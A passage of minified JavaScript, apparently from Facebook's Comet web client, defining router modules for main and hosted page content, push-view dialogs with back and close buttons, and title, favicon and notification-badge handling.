    98
  );
  __d(
    "CometPageContent.react",
    [
      "CometHeroInteractionWithDiv.react",
      "CometRouteRenderer.react",
      "CometRouterHostedRouteContext",
      "CometRouterParentRouteContext",
      "react",
      "unrecoverableViolation",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || d("react");
      function a(a) {
        var b, d;
        a = a.routeState;
        var e = a.hosted;
        a = a.main;
        b = (b = a.route) != null ? b : null;
        d = (d = e == null ? void 0 : e.route) != null ? d : null;
        if (b) {
          if (e && b.isCometRootContainer === !0) {
            if (!d || !d.hostableView)
              throw c("unrecoverableViolation")(
                "Unexpected: Hosted route set without a hosted view",
                "comet_ui"
              );
            if (d.hostableView)
              return i.jsx(c("CometRouterHostedRouteContext").Provider, {
                value: d,
                children: i.jsx(c("CometRouteRenderer.react"), {
                  renderType: "main",
                  routeInfo: a,
                  children: i.jsx(c("CometRouterHostedRouteContext").Provider, {
                    value: null,
                    children: i.jsx(c("CometRouterParentRouteContext").Provider, {
                      value: b,
                      children: i.jsx(c("CometHeroInteractionWithDiv.react"), {
                        interactionDesc: e.route.tracePolicy,
                        interactionUUID: e.navigationInteractionID,
                        pageletName: "HostedView",
                        children: i.jsx(c("CometRouteRenderer.react"), {
                          renderType: "hosted",
                          routeInfo: e,
                        }),
                      }),
                    }),
                  }),
                }),
              });
          }
          return i.jsx(c("CometRouterHostedRouteContext").Provider, {
            value: null,
            children: i.jsx(c("CometRouteRenderer.react"), {
              renderType: "main",
              routeInfo: a,
            }),
          });
        }
        throw c("unrecoverableViolation")(
          "Unexpected: No Root component for the page",
          "comet_ui"
        );
      }
      a.displayName = a.name + " [from " + f.id + "]";
      b = i.memo(a);
      g["default"] = b;
    },
    98
  );
  __d(
    "CometRouterMaintainedRoutesStateContext",
    ["react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h;
      a = h || d("react");
      b = a.createContext({});
      g["default"] = b;
    },
    98
  );
  __d(
    "MaintainedRouteConfig",
    ["gkx", "qex"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      a = c("gkx")("1217157") ? 6e4 : 2e4;
      d = (b = c("qex")._("49")) != null ? b : -1;
      e = {
        barcelona_feed: {
          maintained: !0,
          maintainRouteForMs: 20 * 60 * 1e3,
          maintainRouteWhenJSHeapBelow: d,
        },
        global_serp: {
          maintained: !0,
          maintainRouteForMs: 2 * 60 * 1e3,
          maintainRouteWhenJSHeapBelow: d,
        },
        home: {
          maintained: a > 0,
          maintainRouteForMs: a,
          maintainRouteWhenJSHeapBelow: d,
        },
        messenger: { maintained: !c("gkx")("1292"), visibilityHidden: !0 },
      };
      g["default"] = e;
    },
    98
  );
  __d(
    "useCometRouterMainTabKey",
    ["unrecoverableViolation", "useCometRouterState"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a() {
        var a = c("useCometRouterState")();
        if (a == null)
          throw c("unrecoverableViolation")(
            "Attempting to get main tab key without a router state (provided by the CometRouterStateProvider/CometRouterStateContext).",
            "comet_infra"
          );
        return (a = a.main.route.tabKey) != null ? a : "__main_tab";
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometMainRoutes.react",
    [
      "CometContentWrapperContext",
      "CometHeroInteractionWithDiv.react",
      "CometLayerKeyCommandWrapper.react",
      "CometPageContent.react",
      "CometRouterMaintainedRoutesStateContext",
      "HiddenSubtreeContextProvider.react",
      "MaintainedRouteConfig",
      "getCometEntityKey",
      "react",
      "recoverableViolation",
      "unrecoverableViolation",
      "useCometRouterMainTabKey",
      "useCometRouterState",
      "useCometScrollAnchor",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react"));
      b = h;
      var j = b.useContext,
        k = b.useEffect;
      function l(a) {
        var b = a.mainRoute;
        a = a.routerState;
        b = b;
        a = a;
        a == null && b != null && (a = { main: b, routeKey: "maintained" });
        return a ? i.jsx(c("CometPageContent.react"), { routeState: a }) : null;
      }
      l.displayName = l.name + " [from " + f.id + "]";
      function m(a) {
        return a;
      }
      function n(a) {
        if (a.tabKey != null) return a.tabKey;
        a = c("getCometEntityKey")(a);
        return a != null && a.entity_type != null
          ? a.entity_id != null
            ? a.entity_type + "||" + a.entity_id
            : a.entity_type
          : "__main_tab";
      }
      function a(a) {
        var b,
          e = a.contentRefProvider,
          f = a.contentStyleProvider,
          g = a.contentXStyleProvider,
          h = c("useCometRouterState")();
        a = j(c("CometContentWrapperContext"));
        a = a.mainRoutesWrapper;
        a = (a = a) != null ? a : m;
        if (h == null)
          throw c("unrecoverableViolation")(
            "Attempting to render main routes without a router state (provided by the CometRouterStateProvider/CometRouterStateContext).",
            "comet_infra"
          );
        var o = j(c("CometRouterMaintainedRoutesStateContext")),
          p = c("useCometRouterMainTabKey")();
        k(
          function () {
            p != null &&
              o[p] != null &&
              c("recoverableViolation")(
                "Tabkey duplication between main and maintained",
                "comet_infra"
              );
          },
          [p, o]
        );
        var q = babelHelpers["extends"]({}, o, ((b = {}), (b[p] = h.main), b));
        b = Object.keys(q);
        return i.jsx(i.Fragment, {
          children: a(
            b
              .map(function (a) {
                var b,
                  j = q[a];
                if (j == null) return null;
                var k = a === p,
                  m = j.navigationInteractionID,
                  o = j.route.tracePolicy;
                b =
                  a != null &&
                  ((b = c("MaintainedRouteConfig")[a]) == null
                    ? void 0
                    : b.visibilityHidden);
                var r = n(j.route);
                return i.jsx(
                  c("HiddenSubtreeContextProvider.react"),
                  {
                    isBackgrounded: !k,
                    isHidden: !k,
                    children: i.jsx(c("CometHeroInteractionWithDiv.react"), {
                      hidden: !k,
                      htmlAttributes: {
                        style:
                          f == null
                            ? void 0
                            : f({
                                isHidden: !k,
                                routeInfo: j,
                                tabVisibilityHidden: b,
                              }),
                      },
                      interactionDesc: o,
                      interactionUUID: m,
                      pageletName: "page",
                      ref:
                        e == null
                          ? void 0
                          : e({
                              isHidden: !k,
                              routeInfo: j,
                              tabVisibilityHidden: b,
                            }),
                      xstyle: g({
                        isHidden: !k,
                        routeInfo: j,
                        tabVisibilityHidden: b,
                      }),
                      children: i.jsx(c("CometLayerKeyCommandWrapper.react"), {
                        debugName: "tab layer for: " + a,
                        children: i.jsx(
                          d("useCometScrollAnchor").CometScrollFixerRoot,
                          {
                            children: k
                              ? i.jsx(l, { routerState: k ? h : null })
                              : i.jsx(l, { mainRoute: j }),
                          }
                        ),
                      }),
                    }),
                  },
                  r
                );
              })
              .filter(Boolean)
          ),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "isRouteTransparent",
    [],
    function (a, b, c, d, e, f) {
      "use strict";
      function a(a) {
        if (a.routeType === "routable_dialog") return !0;
        return a.transparent === !0 ? !0 : !1;
      }
      f["default"] = a;
    },
    66
  );
  __d(
    "useCometIsMainRouteMaintained",
    ["MaintainedRouteConfig", "useCometRouterMainTabKey"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a() {
        var a = c("useCometRouterMainTabKey")();
        return (
          a != null &&
          ((a = c("MaintainedRouteConfig")[a]) == null ? void 0 : a.maintained)
        );
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "getCometRouteScrollKey",
    ["getCometEntityKey", "stableStringify"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h = typeof WeakMap === "function" ? new WeakMap() : new Map();
      function a(a) {
        var b,
          d = a.route;
        a = a.timeSpentMetaData;
        if (
          ((b = d.timeSpentConfig) == null
            ? void 0
            : (b = b.session_ids) == null
            ? void 0
            : b.search_sid) != null &&
          (a == null
            ? void 0
            : (b = a.session_ids) == null
            ? void 0
            : b.search_sid) != null
        )
          return a.session_ids.search_sid;
        b = h.get(d);
        if (b != null) return b;
        if (d.scrollKey != null) return d.scrollKey;
        a = c("getCometEntityKey")(d);
        if (a != null && a.entity_type != null && a.entity_id != null) {
          b = a.entity_type + "||" + a.entity_id;
          h.set(d, b);
          return b;
        }
        a = d.hostableView || d.rootView;
        b = a.allResources[0] || a.resource;
        b = b.getModuleId();
        a = Object.keys(babelHelpers["extends"]({}, a.props)).filter(function (
          a
        ) {
          return a.endsWith("ID");
        });
        b = b + "||" + c("stableStringify")(a);
        h.set(d, b);
        return b;
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "useCometMainRouteScrollKey",
    ["getCometRouteScrollKey", "unrecoverableViolation", "useCometRouterState"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a() {
        var a = c("useCometRouterState")();
        if (a == null)
          throw c("unrecoverableViolation")(
            "Attempting to get main tab key without a router state (provided by the CometRouterStateProvider/CometRouterStateContext).",
            "comet_infra"
          );
        var b = a.main.mainScrollKey;
        return a.hosted != null
          ? c("getCometRouteScrollKey")(a.hosted)
          : b != null
          ? c("getCometRouteScrollKey")(a.main) + "__" + b
          : c("getCometRouteScrollKey")(a.main);
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometAppMainContentAreaRenderer.react",
    [
      "CometMainContentWrapper.react",
      "CometMainRoutes.react",
      "CometRouterPushViewStackContext",
      "ContentVisibility",
      "cr:683059",
      "isRouteTransparent",
      "react",
      "unrecoverableViolation",
      "useCometIsMainRouteMaintained",
      "useCometMainRouteScrollKey",
      "useCometRouterState",
      "useResizeObserver",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = h || (h = d("react"));
      e = h;
      var j = e.useContext,
        k = e.useMemo,
        l = e.useRef,
        m = {
          contentContainer: {
            display: "x78zum5",
            flexDirection: "xdt5ytf",
            minHeight: "x1t2pt76",
            position: "x1n2onr6",
            zIndex: "x1ja2u2z",
            $$css: !0,
          },
          contentContainerContainment: { contain: "x1q4h3jn", $$css: !0 },
          contentContainerHidden: { display: "x1s85apg", $$css: !0 },
          contentContainerHiddenContentVisibility: {
            contentVisibility: "xdps06",
            position: "x10l6tqk",
            start: "xg2i1dl",
            left: null,
            right: null,
            $$css: !0,
          },
          contentContainerVisibilityHidden: { visibility: "xlshs6z", $$css: !0 },
          contentContainerWithNegativeMarginBottom: {
            marginBottom: "x10cihs4",
            $$css: !0,
          },
        };
      function a(a) {
        var e = a.disableNavigationScrollReset;
        e = e === void 0 ? !1 : e;
        var f = a.disableNegativeMarginBottom,
          g = f === void 0 ? !1 : f;
        f = a.scrollKeyPrefix;
        f = f === void 0 ? null : f;
        var h = a.shouldRenderTopNav;
        h = h === void 0 ? !0 : h;
        a = a.shouldUseDvhMinHeight;
        a = a === void 0 ? !1 : a;
        function n(a) {
          if (!d("ContentVisibility").CONTENT_VISIBILITY_ENABLED_FOR_TABS)
            return !1;
          a = a.route.tracePolicy === "comet.home";
          return d("ContentVisibility").CONTENT_VISIBILITY_ENABLED_FOR_TABS && a;
        }
        var o = c("useCometRouterState")(),
          p = j(c("CometRouterPushViewStackContext"));
        if (o == null)
          throw c("unrecoverableViolation")(
            "Attempting to render tab bar without a router state (provided by the CometRouterStateProvider/CometRouterStateContext).",
            "comet_infra"
          );
        var q = (p || []).some(function (a) {
            a = a.route;
            return !c("isRouteTransparent")(a);
          }),
          r = k(function () {
            return function (a, c) {
              b("cr:683059") && b("cr:683059").setInitialScrollY(c);
            };
          }, []),
          s = c("useCometMainRouteScrollKey")();
        f != null && (s = f + "|" + s);
        f = c("useCometIsMainRouteMaintained")();
        var t = l({ height: 0, width: 0 }),
          u = c("useResizeObserver")(function (a, b) {
            b instanceof HTMLElement &&
              !b.hidden &&
              d("ContentVisibility").CONTENT_VISIBILITY_ENABLED_FOR_TABS &&
              ((t.current.height = a.height), (t.current.width = a.width));
          });
        return i.jsx(c("CometMainContentWrapper.react"), {
          contextKey: s,
          detachedDefaultValue:
            p == null
              ? void 0
              : p.some(function (a) {
                  return a.route.backgroundRouteConfig != null;
                }),
          disableNavigationScrollReset: e,
          hiddenWhenDetached: q,
          maintainScrollForContext: !o.hosted && f === !0,
          onInitialScroll: r,
          shouldRenderTopNav: h,
          shouldUseDvhMinHeight: a,
          children: i.jsx(c("CometMainRoutes.react"), {
            contentRefProvider: function (a) {
              a = a.routeInfo;
              if (n(a)) return u;
            },
            contentStyleProvider: function (a) {
              var b = a.isHidden;
              a = a.routeInfo;
              if (b && n(a))
                return {
                  containIntrinsicSize:
                    t.current.width + "px " + t.current.height + "px",
                };
            },
            contentXStyleProvider: function (a) {
              var b = a.isHidden,
                c = a.routeInfo;
              a = a.tabVisibilityHidden;
              c = n(c);
              return [
                m.contentContainer,
                !g && m.contentContainerWithNegativeMarginBottom,
                c && m.contentContainerContainment,
                b && a !== !0 && !c && m.contentContainerHidden,
                b && a !== !0 && c && m.contentContainerHiddenContentVisibility,
                b && a === !0 && !c && m.contentContainerVisibilityHidden,
                b && a === !0 && c && m.contentContainerHiddenContentVisibility,
              ];
            },
          }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometBackOnEsc.react",
    [
      "fbt",
      "CometKeys",
      "react",
      "useCometRouterDispatcher",
      "useLayerKeyCommands",
    ],
    function (a, b, c, d, e, f, g, h) {
      "use strict";
      var i;
      b = i || d("react");
      var j = b.useCallback,
        k = b.useMemo;
      function a(a) {
        a = a.closeOnEsc;
        var b = a === void 0 ? !1 : a,
          d = c("useCometRouterDispatcher")(),
          e = j(
            function () {
              d && d.goBack && d.goBack();
            },
            [d]
          ),
          f = j(
            function () {
              d && d.popPushView && d.popPushView();
            },
            [d]
          );
        a = k(
          function () {
            return [
              {
                command: { key: c("CometKeys").ESCAPE },
                description: b
                  ? h._("__JHASH__a_qj__uOTBG__JHASH__")
                  : h._("__JHASH__PS-q9pFoZzf__JHASH__"),
                handler: b ? f : e,
              },
            ];
          },
          [e, f, b]
        );
        c("useLayerKeyCommands")(a);
        return null;
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometPushViewBackButton.react",
    [
      "fbt",
      "ix",
      "CometCircleButton.react",
      "Locale",
      "fbicon",
      "react",
      "useCometRouterDispatcher",
    ],
    function (a, b, c, d, e, f, g, h, i) {
      "use strict";
      var j,
        k = j || d("react"),
        l = d("Locale").isRTL();
      function a(a) {
        var b = a.setIsButtonFocused,
          e = c("useCometRouterDispatcher")();
        a = function () {
          e && e.goBack && e.goBack();
        };
        return k.jsx(c("CometCircleButton.react"), {
          color: "primary",
          icon: l
            ? d("fbicon")._(i("514454"), 20)
            : d("fbicon")._(i("512647"), 20),
          label: h._("__JHASH__PS-q9pFoZzf__JHASH__"),
          onFocusIn: function () {
            return b(!0);
          },
          onFocusOut: function () {
            return b(!1);
          },
          onPress: a,
          size: 40,
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometPushViewCloseButton.react",
    [
      "fbt",
      "ix",
      "CometCircleButton.react",
      "fbicon",
      "react",
      "useCometRouterDispatcher",
    ],
    function (a, b, c, d, e, f, g, h, i) {
      "use strict";
      var j,
        k = j || d("react");
      function a(a) {
        var b = a.setIsButtonFocused,
          e = c("useCometRouterDispatcher")();
        a = function () {
          e && e.popPushView && e.popPushView();
        };
        return k.jsx(c("CometCircleButton.react"), {
          color: "primary",
          icon: d("fbicon")._(i("478233"), 20),
          label: h._("__JHASH__cCrSTii9yXy__JHASH__"),
          onFocusIn: function () {
            return b(!0);
          },
          onFocusOut: function () {
            return b(!1);
          },
          onPress: a,
          size: 40,
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometPushViewNavigationButton.react",
    [
      "CometPushViewBackButton.react",
      "CometPushViewCloseButton.react",
      "react",
      "stylex",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i,
        j = i || (i = d("react")),
        k = i.useState,
        l = {
          buttonFocused: { opacity: "x1hc1fzr", $$css: !0 },
          closeButton: {
            height: "x1vqgdyp",
            opacity: "xg01cxk",
            position: "xixxii4",
            start: "x16q8cke",
            left: null,
            right: null,
            top: "x1nq8r5b",
            width: "x100vrsf",
            zIndex: "x1vjfegm",
            $$css: !0,
          },
        };
      function a(a) {
        a = a.navigationType;
        var b = k(!1),
          d = b[0];
        b = b[1];
        return j.jsx("div", {
          className: (h || (h = c("stylex")))(
            l.closeButton,
            d && l.buttonFocused
          ),
          children:
            a === "BACK"
              ? j.jsx(c("CometPushViewBackButton.react"), {
                  setIsButtonFocused: b,
                })
              : j.jsx(c("CometPushViewCloseButton.react"), {
                  setIsButtonFocused: b,
                }),
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometPushView.react",
    [
      "BaseCometModal.react",
      "BaseViewportMarginsAddonContextProvider.react",
      "CometBackOnEsc.react",
      "CometPushViewNavigationButton.react",
      "justknobx",
      "react",
      "stylex",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i,
        j = i || d("react"),
        k = 60,
        l = {
          dialogRoot: {
            display: "x78zum5",
            flexDirection: "xdt5ytf",
            flexGrow: "x1iyjqo2",
            $$css: !0,
          },
          mask: {
            backgroundColor: "x443n21",
            bottom: "x1ey2m1c",
            end: "xds687c",
            left: null,
            right: null,
            position: "xixxii4",
            start: "x17qophe",
            top: "x13vifvy",
            $$css: !0,
          },
          pushViewBackgroundWash: { backgroundColor: "x443n21", $$css: !0 },
          view: {
            display: "x78zum5",
            flexDirection: "xdt5ytf",
            minHeight: "xg6iff7",
            position: "x1n2onr6",
            zIndex: "x1ja2u2z",
            $$css: !0,
          },
          viewWithTabBar: { minHeight: "xat3117", top: "xxzkxad", $$css: !0 },
        };
      function a(a) {
        var b = a.background;
        b = b === void 0 ? "web-wash" : b;
        var d = a.children,
          e = a.contextKey,
          f = a.hasTabBar;
        f = f === void 0 ? !1 : f;
        var g = a.hidden;
        g = g === void 0 ? !1 : g;
        var i = a.interactionDesc,
          m = a.interactionUUID,
          n = a.isDialog;
        n = n === void 0 ? !1 : n;
        var o = a.label,
          p = a.shouldUseCloseButton;
        p = p === void 0 ? !1 : p;
        a = a.topNavigationComponent;
        a = a === void 0 ? c("CometPushViewNavigationButton.react") : a;
        a = a;
        o = n
          ? j.jsx(
              "div",
              babelHelpers["extends"](
                {
                  "aria-label": o,
                  className: "x78zum5 xdt5ytf x1iyjqo2",
                  "data-testid": void 0,
                },
                p ? { role: "dialog" } : {},
                { children: d }
              )
            )
          : j.jsxs(j.Fragment, {
              children: [
                b === "web-wash" &&
                  j.jsx("div", {
                    className:
                      "x443n21 x1ey2m1c xds687c xixxii4 x17qophe x13vifvy",
                  }),
                j.jsx(
                  "div",
                  babelHelpers["extends"](
                    {
                      "aria-label": o,
                      className: (h || (h = c("stylex")))(
                        l.view,
                        b === "web-wash" && l.pushViewBackgroundWash,
                        f && l.viewWithTabBar
                      ),
                      "data-testid": void 0,
                    },
                    p ? { role: "dialog" } : {},
                    {
                      children: j.jsxs(
                        c("BaseViewportMarginsAddonContextProvider.react"),
                        {
                          addon: f ? k : 0,
                          children: [
                            j.jsx(a, {
                              navigationType: p === !0 ? "CLOSE" : "BACK",
                            }),
                            d,
                          ],
                        }
                      ),
                    }
                  )
                ),
              ],
            });
        return j.jsxs(c("BaseCometModal.react"), {
          contextKey: e,
          hidden: g,
          interactionDesc: i,
          interactionUUID: m,
          isOverlayTransparent: !(b === "web-wash" || n),
          noPortal: c("justknobx")._("713"),
          stackingBehavior: "above-everything",
          children: [
            p ? j.jsx(c("CometBackOnEsc.react"), { closeOnEsc: !0 }) : null,
            o,
          ],
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "CometAppViewStack.react",
    [
      "BaseDOMContainer.react",
      "BasePortalTargetContext",
      "BaseViewportMarginsContext",
      "CometPushView.react",
      "CometRouteRenderer.react",
      "CometRouterPushViewStackContext",
      "ExecutionEnvironment",
      "getCometRouteScrollKey",
      "isRouteTransparent",
      "justknobx",
      "react",
      "useStable",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i,
        j = i || (i = d("react")),
        k = i.useContext,
        l = { bottom: 0, left: 0, right: 0, top: 0 };
      function a(a) {
        var b = a.baseView,
          d = a.topNavigationComponent;
        a = a.useBodyAsPortalsContainer;
        a = a === void 0 ? !1 : a;
        var e = k(c("CometRouterPushViewStackContext")),
          f = c("useStable")(function () {
            return (h || (h = c("ExecutionEnvironment"))).canUseDOM
              ? document.createElement("div")
              : null;
          }),
          g = !1;
        e =
          e != null &&
          j.jsx(c("BaseViewportMarginsContext").Provider, {
            value: l,
            children: e.reduceRight(function (a, b) {
              b.depth;
              var e = b.key;
              b = babelHelpers.objectWithoutPropertiesLoose(b, ["depth", "key"]);
              var f = b.route.tracePolicy,
                h = c("isRouteTransparent")(b.route),
                i = b.navigationInteractionID,
                k = b.route.useCloseButton === !0;
              a.unshift(
                j.jsx(
                  c("CometPushView.react"),
                  {
                    background: h ? "none" : "web-wash",
                    contextKey: c("getCometRouteScrollKey")(b),
                    hidden: g,
                    interactionDesc: f,
                    interactionUUID: i,
                    isDialog: b.route.routeType === "routable_dialog",
                    label: b.route.label,
                    shouldUseCloseButton: k,
                    topNavigationComponent: d,
                    children: j.jsx(c("CometRouteRenderer.react"), {
                      renderType: "pushView",
                      routeInfo: b,
                    }),
                  },
                  e
                )
              );
              c("isRouteTransparent")(b.route) || (g = !0);
              return a;
            }, []),
          });
        var i = c("justknobx")._("713");
        return j.jsxs(j.Fragment, {
          children: [
            j.jsxs(c("BasePortalTargetContext").Provider, {
              value: a ? document.body : f,
              children: [b, !i && e],
            }),
            !a && j.jsx(c("BaseDOMContainer.react"), { node: f }),
            i && e,
          ],
        });
      }
      a.displayName = a.name + " [from " + f.id + "]";
      g["default"] = a;
    },
    98
  );
  __d(
    "getBreadcrumbTitleFromRouteState",
    [],
    function (a, b, c, d, e, f) {
      "use strict";
      function a(a, b, c, d) {
        d === void 0 && (d = !1);
        if (!b) return a;
        var e = b.hosted,
          f = b.main;
        b = b.pushViewStack;
        c = (c = c) != null ? c : " | ";
        var g = [];
        if (b != null && b.length > 0) {
          b = b[b.length - 1];
          b = (b = b.route.meta) == null ? void 0 : b.title;
          b != null && g.push(b);
        } else {
          if (e != null) {
            e = (b = e.route.meta) == null ? void 0 : b.title;
            e != null && g.push(e);
          }
          e = (b = f.route.meta) == null ? void 0 : b.title;
          e != null && g.push(e);
          e = (b = f.route.meta) == null ? void 0 : b.accessory;
          e != null && g.push(e);
        }
        (!d || g.length === 0) && g.push(a);
        f = new Set(g);
        return f.size !== g.length ? a : g.join(c);
      }
      f["default"] = a;
    },
    66
  );
  __d(
    "useCometMetaManagerRouteFavicon",
    [
      "ExecutionEnvironment",
      "react",
      "recoverableViolation",
      "useCometRouterState",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h, i;
      b = i || d("react");
      var j = b.useEffect,
        k = b.useRef;
      function a(a) {
        var b,
          d = c("useCometRouterState")(),
          e =
            (b =
              d == null
                ? void 0
                : (b = d.hosted) == null
                ? void 0
                : (b = b.route.meta) == null
                ? void 0
                : b.favicon) != null
              ? b
              : d == null
              ? void 0
              : (b = d.main.route.meta) == null
              ? void 0
              : b.favicon,
          f = k(null);
        j(
          function () {
            if (!(h || (h = c("ExecutionEnvironment"))).canUseDOM) return;
            f.current == null &&
              (f.current = document.querySelector(
                'link[rel*=icon][href*=".ico"]'
              ));
            var b = f.current;
            if (b != null && b instanceof HTMLLinkElement) {
              var d = b.dataset,
                g = d.badgedIcon;
              d = d.defaultIcon;
              a &&
                (g == null || d == null) &&
                c("recoverableViolation")(
                  "Unable to update favicon. icon href was not found on the favicon element, please set data-default-icon and data-badged-icon attributes.",
                  "comet_ui"
                );
              d = e ? e["default"] : d;
              g = e ? e.badged : g;
              g = a && g != null ? g : d;
              b.href !== g && g != null && (b.href = g);
            }
          },
          [e, a]
        );
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "useDocumentTitleBlinkEffect",
    ["ExecutionEnvironment", "clearInterval", "react", "setInterval"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i,
        j = (i || d("react")).useEffect,
        k = 1500;
      function a(a) {
        var b = a.blinkingTitle,
          d = a.routeTitle;
        j(
          function () {
            if (!(h || (h = c("ExecutionEnvironment"))).canUseDOM) return;
            if (b == null || b === "") {
              document.title !== d && (document.title = d);
              return;
            }
            var a = c("setInterval")(function () {
              document.title === d ? (document.title = b) : (document.title = d);
            }, k);
            return function () {
              c("clearInterval")(a), (document.title = d);
            };
          },
          [b, d]
        );
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometRouterMetaManager",
    [
      "getBreadcrumbTitleFromRouteState",
      "useCometMetaManagerRouteFavicon",
      "useCometRouterState",
      "useDocumentTitleBlinkEffect",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a) {
        var b = a.appTitle,
          d = a.badgeConfig,
          e = a.blinkingTitle,
          f = a.customBreadcrumbTitleSeparator;
        f = f === void 0 ? null : f;
        var g = a.onlyShowAppTitleIfNoTitle;
        g = g === void 0 ? !1 : g;
        a = a.shouldBadgeFavicon;
        a = a === void 0 ? !1 : a;
        var i = c("useCometRouterState")();
        b = c("getBreadcrumbTitleFromRouteState")(b, i, f, g);
        i = d ? h({ badgeConfig: d, title: b }) : b;
        c("useDocumentTitleBlinkEffect")({ blinkingTitle: e, routeTitle: i });
        c("useCometMetaManagerRouteFavicon")(a);
        return null;
      }
      function h(a) {
        var b = a.badgeConfig,
          c = b.badgeCount,
          d = b.badgeCountAlternate;
        b = b.badgeCountLimit;
        a = a.title;
        c = c > b ? "(" + b + "+)" : c > 0 ? "(" + c + ")" : "";
        var e = "";
        d !== void 0 && (e = d > b ? "[" + b + "+]" : d > 0 ? "[" + d + "]" : "");
        b = c !== "" || e !== "" ? " " : "";
        return "" + c + e + b + a;
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "useBlinkingTitleMessage",
    ["CometBlinkingTitleMessageContext", "react"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i = (h || d("react")).useContext;
      function a() {
        var a = i(c("CometBlinkingTitleMessageContext"));
        return a != null ? a.toString() : null;
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "useIsDsaNotifications",
    ["getCometEntityKey", "useCometRouterState"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a() {
        var a = c("useCometRouterState")();
        if (a != null) {
          a = c("getCometEntityKey")(a.main.route);
          if (
            (a == null ? void 0 : a.entity_type) === "notifications_feeds" &&
            (a == null ? void 0 : a.section) === "notifications"
          )
            return !0;
        }
        return !1;
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "useMaybeZeroNotificationsBadgeCount",
    ["useIsDsaNotifications"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a(a) {
        var b = c("useIsDsaNotifications")();
        return b ? 0 : (b = a) != null ? b : 0;
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "useCometMetaManagerBadgeCount",
    [
      "RelayHooks",
      "relay-runtime",
      "useCometMetaManagerBadgeCountQuery.graphql",
      "useMaybeZeroNotificationsBadgeCount",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i =
          h !== void 0
            ? h
            : (h = b("useCometMetaManagerBadgeCountQuery.graphql")),
        j = 15,
        k = !1,
        l = { environment: "MAIN_SURFACE" };
      function a() {
        var a = d("RelayHooks").useRelayEnvironment();
        if (k === !1) {
          var b = d("relay-runtime").createOperationDescriptor(
            c("useCometMetaManagerBadgeCountQuery.graphql"),
            l
          );
          a.commitPayload(b, l);
          k = !0;
        }
        a = d("RelayHooks").useLazyLoadQuery(i, l, { fetchPolicy: "store-only" });
        b = c("useMaybeZeroNotificationsBadgeCount")(
          a == null
            ? void 0
            : (b = a.viewer) == null
            ? void 0
            : b.notifications_unseen_count
        );
        if (a == null || a.viewer == null)
          return { messengerBadgeCount: 0, notificationsBadgeCount: b };
        a = a.viewer.message_threads;
        a = Math.min(
          j,
          (a = a == null ? void 0 : a.unseen_count) != null ? a : 0
        );
        return { messengerBadgeCount: a, notificationsBadgeCount: b };
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "useCometMetaManagerSubscriptions",
    [
      "CometRelay",
      "JSScheduler",
      "cr:1738904",
      "react",
      "requireDeferred",
      "useToasterStateManager",
    ],
    function (a, b, c, d, e, f, g) {
      "use strict";
      var h,
        i,
        j = (h || d("react")).useEffect,
        k = c("requireDeferred")(
          "CometBatchNotificationsStateChangeSubscription"
        ).__setRef("useCometMetaManagerSubscriptions"),
        l = c("requireDeferred")(
          "CometNotificationsStateChangeSubscription"
        ).__setRef("useCometMetaManagerSubscriptions");
      function a() {
        var a = d("CometRelay").useRelayEnvironment(),
          e = c("useToasterStateManager")();
        j(
          function () {
            var c, f, g;
            (i || (i = d("JSScheduler"))).scheduleSpeculativeCallback(
              function () {
                k.onReady(function (b) {
                  b = b.batchSubscribe;
                  f = b(a);
                }),
                  l.onReady(function (b) {
                    b = b.subscribe;
                    c = b(a);
                  }),
                  b("cr:1738904") != null &&
                    b("cr:1738904").onReady(function (b) {
                      b = b.subscribeToFriendNotifs;
                      g = b(a, e);
                    });
              }
            );
            return function () {
              c && c.dispose(), f && f.dispose(), g && g.dispose();
            };
          },
          [a, e]
        );
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "useIsCurrentRouteMediaViewer",
    ["useCometRouterState"],
    function (a, b, c, d, e, f, g) {
      "use strict";
      function a() {
        var a = c("useCometRouterState")();
        if (a == null) return !1;
        var b = a.main;
        a = a.pushViewStack;
        a = a && a.length > 0 ? a[a.length - 1] : b;
        b = a.route;
        return b.routeType === "media_viewer";
      }
      g["default"] = a;
    },
    98
  );
  __d(
    "CometMetaManager.react",
    [
      "cx",
